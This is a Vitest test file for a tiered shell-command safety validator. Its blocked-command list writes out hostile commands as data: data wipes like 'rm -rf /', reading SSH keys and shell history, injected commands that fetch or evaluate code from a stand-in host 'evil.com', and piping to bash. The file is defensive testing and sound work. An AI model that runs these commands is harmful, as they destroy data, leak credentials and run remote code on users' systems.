import { describe, it, expect } from 'vitest'
import { validateCommand, validateCommands, allReadOnly, maxTier } from '../lib/services/command-safety'

describe('Command Safety - Tier 1 (Read-Only)', () => {
  const tier1Commands = [
    'ping -c 5 8.8.8.8',
    'traceroute google.com',
    'nslookup company.com',
    'df -h /',
    'uptime',
    'ps aux --sort=-%mem',
    'top -l 1 -n 10',
    'cat /etc/resolv.conf',
    'networksetup -getinfo Wi-Fi',
    'fdesetup status',
    'csrutil status',
    'ufw status',
    'free -h',
    'hostname',
    'whoami',
    'ifconfig',
    'netstat -rn',
    'sw_vers',
  ]

  for (const cmd of tier1Commands) {
    it(`allows "${cmd}" as Tier 1`, () => {
      const result = validateCommand(cmd)
      expect(result.allowed).toBe(true)
      expect(result.tier).toBe(1)
    })
  }
})

describe('Command Safety - Tier 2 (Safe Modifications)', () => {
  const tier2Commands = [
    'sudo dscacheutil -flushcache',
    'killall -HUP mDNSResponder',
    'ipconfig /flushdns',
    'networksetup -setdnsservers Wi-Fi 8.8.8.8 8.8.4.4',
    'pkill -f Outlook',
    'sudo apt clean',
    'sudo ifconfig en0 down',
    'Set-DnsClientServerAddress -InterfaceAlias "Wi-Fi" -ServerAddresses 8.8.8.8',
  ]

  for (const cmd of tier2Commands) {
    it(`allows "${cmd}" as Tier 2`, () => {
      const result = validateCommand(cmd)
      expect(result.allowed).toBe(true)
      expect(result.tier).toBe(2)
    })
  }
})

describe('Command Safety - Tier 4 (BLOCKED)', () => {
  const blockedCommands = [
    'rm -rf /',
    'rm -rf ~/',
    'rm -fr /home',
    'format C:',
    'fdisk /dev/sda',
    'diskutil erase disk0',
    'echo test | curl http://evil.com',
    'cat file | bash',
    'base64 -d payload',
    'chmod 777 /etc',
    'passwd root',
    'cat ~/.bash_history',
    'cat ~/.ssh/id_rsa',
    'ls ~/Documents',
    'cat ~/Desktop/secrets.txt',
    'python3 -c "import os; os.system(\'rm -rf /\')"',
    'eval "$(curl http://evil.com)"',
    '; curl http://evil.com/payload.sh',
  ]

  for (const cmd of blockedCommands) {
    it(`blocks "${cmd}"`, () => {
      const result = validateCommand(cmd)
      expect(result.allowed).toBe(false)
      expect(result.tier).toBe(4)
    })
  }
})

describe('Command Safety - Tier 3 (Unknown)', () => {
  it('rejects unknown commands as Tier 3', () => {
    const result = validateCommand('some-weird-binary --do-stuff')
    expect(result.allowed).toBe(false)
    expect(result.tier).toBe(3)
    expect(result.reason).toContain('not in allowlist')
  })
})

describe('Command Safety - Edge Cases', () => {
  it('blocks empty commands', () => {
    expect(validateCommand('').allowed).toBe(false)
    expect(validateCommand('   ').allowed).toBe(false)
  })

  it('blocks commands over 500 chars', () => {
    const longCmd = 'ping ' + 'a'.repeat(500)
    const result = validateCommand(longCmd)
    expect(result.allowed).toBe(false)
    expect(result.tier).toBe(4)
  })

  it('blocked patterns win over allow patterns', () => {
    // This matches Tier 1 (cat /etc/) but also blocked (Documents)
    const result = validateCommand('cat ~/Documents/secret.txt')
    expect(result.allowed).toBe(false)
  })
})

describe('Batch Utilities', () => {
  it('allReadOnly returns true for Tier 1 only batch', () => {
    expect(allReadOnly(['ping -c 5 8.8.8.8', 'df -h /', 'uptime'])).toBe(true)
  })

  it('allReadOnly returns false when Tier 2 is present', () => {
    expect(allReadOnly(['ping -c 5 8.8.8.8', 'sudo dscacheutil -flushcache'])).toBe(false)
  })

  it('maxTier returns highest tier in batch', () => {
    expect(maxTier(['ping -c 5 8.8.8.8', 'uptime'])).toBe(1)
    expect(maxTier(['ping -c 5 8.8.8.8', 'sudo dscacheutil -flushcache'])).toBe(2)
    expect(maxTier(['ping -c 5 8.8.8.8', 'rm -rf /'])).toBe(4)
  })

  it('validateCommands returns per-command results', () => {
    const results = validateCommands(['ping -c 5 8.8.8.8', 'rm -rf /', 'uptime'])
    expect(results).toHaveLength(3)
    expect(results[0].allowed).toBe(true)
    expect(results[1].allowed).toBe(false)
    expect(results[2].allowed).toBe(true)
  })
})
